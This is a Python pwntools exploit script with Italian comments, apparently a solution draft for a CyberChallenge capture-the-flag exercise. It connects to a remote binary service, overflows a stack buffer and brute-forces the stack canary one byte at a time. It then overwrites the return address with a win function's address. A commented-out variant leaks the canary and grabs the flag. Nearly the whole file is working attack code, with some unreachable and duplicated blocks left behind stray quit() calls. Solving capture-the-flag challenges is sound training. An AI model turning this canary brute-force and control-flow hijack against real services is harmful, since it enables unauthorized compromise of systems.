from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50200

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

# Ottenuto impostando un breakpoint prima del canary, impostando set follow-fork-mode child in modo da seguire il processo figlio,
# dandogli in pasto un pattern create 100, guardando il contenuto di rbp e infine ottenendo l'offset tramite pattern offset 0x616161616161616a

offset = 72

# Ottenuto tramite p win

win_address = 0x4011f6


base_payload = b"A" * offset
canary = b"\x00"

conn.recvuntil(b"3. Exit\n")
conn.sendline(b"2")
conn.recvline()
conn.sendline(base_payload)

conn.recvuntil(b"3. Exit\n")
conn.sendline(b"2")
conn.recvline()
conn.send(base_payload + canary)

quit()
for j in range(1,8):
    for i in range(0x01, 0xff):
        conn.recvuntil(b"3. Exit\n")
        conn.sendline(b"2")         # Choose function to use
        conn.recvline()

        payload = base_payload + canary + bytes([i])
        print(f"{j}-th canaray byte, {i}-th payload: {payload}")
        conn.send(payload + b"\n")

        crashLine = conn.recvuntil(b"Available commands")
        print(crashLine)
        if(not (b"stack smashing detected" in crashLine)):
            canary += bytes([i])
            print(f"Found {j}-th byte: {bytes([i])}")
            break

    if(len(canary) <= j):
        print("ERROR")
        quit()

conn.clean()
conn.recvuntil(b"3. Exit\n")
conn.send(base_payload + canary + b"B" * 8 + p64(win_address))
conn.interactive()

quit()

for j in range(256):
    conn.recvuntil(b"3. Exit")
    conn.sendline(b"2")

    # Send modified payload
    canary = bytes([j])
    payload = base_payload + canary
    conn.recvuntil(b":")
    conn.sendline(payload)

    conn.recvline() 
    conn.recvline()         # Uppercased: ....
    crashLine = conn.recvline()
    print(crashLine)
    if(not crashLine == b"*** stack smashing detected ***: terminated\n"):
        print(f"Byte n. {1} is {j}")
        print(f"Payload: {payload}, with length = {len(payload)}")
        break
print("Canary: ", canary)

for j in range(256):
    conn.recvuntil(b"3. Exit")
    conn.sendline(b"2")

    # Send modified payload
    payload = base_payload + bytes([j])
    conn.recvuntil(b":")
    conn.sendline(payload)

    conn.recvline() 
    conn.recvline()         # Uppercased: ....
    crashLine = conn.recvline()
    print(crashLine)
    if(not crashLine == b"*** stack smashing detected ***: terminated\n"):
        print(f"Byte n. {2} is {j}")
        print(f"Payload: {payload}, with length = {len(payload)}")
        break

# for i in range(8):
#     for j in range(256):        # Prova tutti i possibili byte
#         conn.recvuntil(b"3. Exit")
#         conn.sendline(b"2")

#         # Send modified payload
#         payload = base_payload + bytes([j])
#         conn.recvuntil(b":")
#         conn.sendline(payload)

#         conn.recvline() 
#         conn.recvline()         # Uppercased: ....
#         crashLine = conn.recvline()
#         if(not crashLine == b"*** stack smashing detected ***: terminated\n"):
#             print(f"Byte n. {i+1} is {j}")
#             print(f"Payload: {payload}, with length = {len(payload)}")
#             break

#     base_payload = payload

conn.interactive()

# canaries_offset = 
# win_function_address = 0x00000000004011a6

# # Aggiungo un \n che andrà a sostituire il null iniziale il canary
# # Ciò porterà il sistema a stampare il canary usato
# payload = b"A" * offset + b"\n"

# conn.recvuntil(b"?\n")
# conn.send(payload)

# # Recupero il canary, aggiungendo il null rimosso in precedenza
# conn.recvline()
# canary = b"\x00" + conn.recv(7)
# canary = int.from_bytes(canary, "little")
# print("CANARY: ", hex(canary))

# payload = b"A" * offset + p64(canary) + b"b" * 8 + p64(win_function_address)

# conn.recvuntil(b"?\n")
# conn.sendline(payload)

# conn.recvuntil(b"flag: ")
# flag = conn.recvline(keepends=False).decode()

# conn.close()
# print(flag)
